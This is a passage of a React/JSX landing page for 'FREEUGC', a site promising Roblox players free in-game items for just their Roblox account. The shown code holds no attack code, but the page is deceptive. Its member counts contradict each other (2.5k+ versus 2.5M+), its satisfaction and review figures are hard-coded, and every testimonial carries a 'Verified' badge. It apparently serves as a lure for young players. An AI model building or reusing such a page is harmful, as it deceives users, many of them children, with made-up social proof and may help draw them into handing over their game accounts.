              <div className="neon-border bg-[#08090f]/80 backdrop-blur-xl p-12 rounded-full w-72 h-72 flex flex-col items-center justify-center relative">
                <div className="absolute -top-3 -right-3 w-8 h-8 rounded-full bg-green-500 flex items-center justify-center">
                  <div className="absolute inset-0 rounded-full bg-green-500 animate-ping opacity-75" />
                </div>
                <span className="text-6xl font-black text-white neon-text mb-2">2.5k+</span>
                <span className="text-sm font-bold text-[#00e5ff] uppercase tracking-widest">Active Members</span>
              </div>
            </div>
          </motion.div>
        </div>
      </section>

      {/* ── MARQUEE ── */}
      <div className="w-full overflow-hidden bg-[#00e5ff] py-3 rotate-1 scale-110 -my-8 z-20 relative">
        <div className="flex whitespace-nowrap animate-marquee w-[200%]">
          {[...Array(2)].map((_, i) => (
            <div key={i} className="flex gap-8 items-center justify-around w-1/2 text-black font-black uppercase text-2xl tracking-widest px-4">
              <span>• Diamond Wings</span><span>• Ruby Crown</span><span>• Neon Katana</span>
              <span>• Shadow Cloak</span><span>• Crystal Staff</span><span>• Void Aura</span>
            </div>
          ))}
        </div>
      </div>

      <div className="w-full overflow-hidden bg-[#2563eb] py-3 -rotate-2 scale-110 z-10 relative mb-24">
        <div className="flex whitespace-nowrap animate-marquee-rev w-[200%]">
          {[...Array(2)].map((_, i) => (
            <div key={i} className="flex gap-8 items-center justify-around w-1/2 text-white font-black uppercase text-2xl tracking-widest px-4 opacity-90">
              <span>⚡ New Drop Alert</span><span>⚡ New Drop Alert</span>
              <span>⚡ New Drop Alert</span><span>⚡ New Drop Alert</span>
            </div>
          ))}
        </div>
      </div>

      {/* ── STATS ── */}
      <section className="py-20 px-4 max-w-7xl mx-auto relative z-20">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
          {[
            { label: "Active Members", value: "2.5M+" },
            { label: "Items Catalogued", value: "1,000+" },
            { label: "Satisfaction", value: "99%" },
            { label: "Community Active", value: "24/7" },
          ].map((stat, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ delay: i * 0.08 }}
              className="neon-border bg-[#10121b] p-6 rounded-2xl text-center"
            >
              <div className="text-3xl md:text-4xl font-black text-white mb-2">{stat.value}</div>
              <div className="text-xs font-bold text-[#00e5ff] uppercase tracking-widest">{stat.label}</div>
            </motion.div>
          ))}
        </div>
      </section>

      {/* ── HOW IT WORKS ── */}
      <section id="how-it-works" className="py-24 px-4 bg-[#05060a]">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-20">
            <h2 className="text-5xl md:text-7xl font-black tracking-tighter uppercase mb-6">
              Get In <span className="text-[#00e5ff] neon-text">3 Steps</span>
            </h2>
            <p className="text-gray-400 text-xl font-medium">Simple, fast, completely free.</p>
          </div>

          <div className="grid md:grid-cols-3 gap-8">
            {steps.map((step, i) => (
              <motion.div
                key={i}
                initial={{ opacity: 0, y: 24 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: i * 0.12 }}
                className="relative p-8 rounded-3xl bg-[#08090f] border border-[#1f2335] overflow-hidden group hover:border-[#2563eb] transition-colors"
              >
                <div className="absolute -right-8 -bottom-16 text-[150px] font-black text-[#1f2335] opacity-50 group-hover:text-[#2563eb]/20 group-hover:scale-110 transition-all duration-500 leading-none pointer-events-none select-none">
                  {step.num}
                </div>
                <div className="relative z-10">
                  <h3 className="text-2xl font-black uppercase text-white mb-4 flex items-center gap-3">
                    <span className="text-[#00e5ff]">&gt;_</span>
                    {step.title}
                  </h3>
                  <p className="text-gray-400 font-medium text-lg">{step.desc}</p>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* ── FEATURES ── */}
      <section className="py-24 px-4 max-w-7xl mx-auto">
        <h2 className="text-4xl md:text-6xl font-black tracking-tighter uppercase mb-16 max-w-2xl">
          Why We're The <span className="text-[#2563eb]">Best</span>
        </h2>
        <div className="grid md:grid-cols-2 gap-6">
          {features.map((feat, i) => (
            <motion.div
              key={i}
              initial={{ opacity: 0, y: 24 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ delay: i * 0.1 }}
              className="bg-[#10121b] p-8 rounded-2xl border-l-4 border-l-[#00e5ff] border-y border-r border-[#1f2335] flex gap-6 hover:bg-[#151824] transition-colors"
            >
              <div className="text-[#00e5ff] flex-shrink-0">{feat.icon}</div>
              <div>
                <h3 className="text-xl font-black uppercase mb-2">{feat.title}</h3>
                <p className="text-gray-400 font-medium">{feat.desc}</p>
              </div>
            </motion.div>
          ))}
        </div>
      </section>

      {/* ── TESTIMONIALS ── */}
      <section className="py-24 px-4 bg-[#05060a]">
        <div className="max-w-7xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-5xl md:text-6xl font-black tracking-tighter uppercase mb-4">
              What They <span className="text-[#00e5ff] neon-text">Say</span>
            </h2>
            <div className="flex items-center justify-center gap-1 mb-2">
              {[...Array(5)].map((_, i) => <Star key={i} className="w-5 h-5 fill-yellow-400 text-yellow-400" />)}
            </div>
            <p className="text-gray-500 font-bold uppercase tracking-widest text-sm">5/5 · 200+ Reviews</p>
          </div>
          <div className="grid md:grid-cols-3 gap-6">
            {testimonials.map((t, i) => (
              <motion.div
                key={i}
                initial={{ opacity: 0, y: 24 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: i * 0.1 }}
                className="neon-border bg-[#10121b] p-6 rounded-2xl"
              >
                <div className="flex items-center gap-1 mb-4">
                  {[...Array(5)].map((_, j) => <Star key={j} className="w-3.5 h-3.5 fill-yellow-400 text-yellow-400" />)}
                </div>
                <p className="text-gray-300 font-medium leading-relaxed mb-5">"{t.text}"</p>
                <div className="flex items-center gap-3">
                  <div className="w-9 h-9 rounded-full bg-gradient-to-br from-[#00e5ff] to-[#2563eb] flex items-center justify-center text-sm font-black text-[#08090f]">
                    {t.name[0]}
                  </div>
                  <div>
                    <p className="font-black text-sm uppercase tracking-wide text-[#00e5ff]">{t.name}</p>
                    <p className="text-xs text-gray-500">{t.days}</p>
                  </div>
                  <span className="ml-auto text-xs bg-green-500/10 text-green-400 border border-green-500/20 px-2 py-0.5 rounded-full font-bold">✓ Verified</span>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* ── CTA ── */}
      <section className="py-32 px-4 relative overflow-hidden mt-12">
        <div className="absolute inset-0 bg-gradient-to-t from-[#00e5ff]/15 to-transparent" />
        <div
          className="absolute inset-0 opacity-10"
          style={{ backgroundImage: "radial-gradient(#00e5ff 1px, transparent 1px)", backgroundSize: "40px 40px" }}
        />
        <div className="max-w-4xl mx-auto text-center relative z-10 flex flex-col items-center">
          <div className="mb-8 p-4 bg-[#08090f] rounded-full inline-block border-2 border-[#00e5ff]/30 shadow-[0_0_30px_rgba(0,229,255,0.2)]">
            <Crown className="w-16 h-16 text-[#00e5ff]" />
          </div>
          <h2 className="text-6xl md:text-8xl font-black tracking-tighter uppercase mb-8 neon-text text-white">
            Ready to Flex?
          </h2>
          <p className="text-2xl text-[#00e5ff] font-bold mb-12 uppercase tracking-wider">
            Join thousands of players already getting free items.
          </p>
          <button
            onClick={handleCtaClick}
            className="btn-glow px-12 py-6 text-2xl font-black bg-white text-[#08090f] hover:bg-[#00e5ff] transition-all duration-300 rounded-2xl uppercase tracking-widest hover:scale-110 active:scale-95"
          >
            Start Claiming Now
          </button>
          <p className="text-xs text-gray-600 mt-5 font-bold uppercase tracking-widest">No fee. No email. Just your Roblox account.</p>
        </div>
      </section>

      {/* ── FOOTER ── */}
      <footer className="border-t border-[#1f2335] bg-[#05060a] py-12 px-4">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
          <div className="flex items-center gap-2">
            <Crown className="w-6 h-6 text-[#00e5ff]/50" />
            <span className="text-xl font-black tracking-tighter italic text-white/40">FREEUGC</span>
          </div>
          <div className="flex gap-6 text-sm font-bold text-gray-500 uppercase tracking-widest">
            <button onClick={handleCtaClick} className="hover:text-white transition-colors">Roblox Group</button>
            {user && (
              <button onClick={logout} className="text-red-400/60 hover:text-red-400 transition-colors flex items-center gap-1.5">
                <LogOut className="w-3.5 h-3.5" /> Log Out
              </button>
            )}
          </div>
          <div className="text-center">
            <p className="text-xs text-gray-600 font-medium">© {new Date().getFullYear()} FREEUGC. All rights reserved.</p>
            <p className="text-xs text-gray-700 mt-1">Not affiliated with Roblox Corporation.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
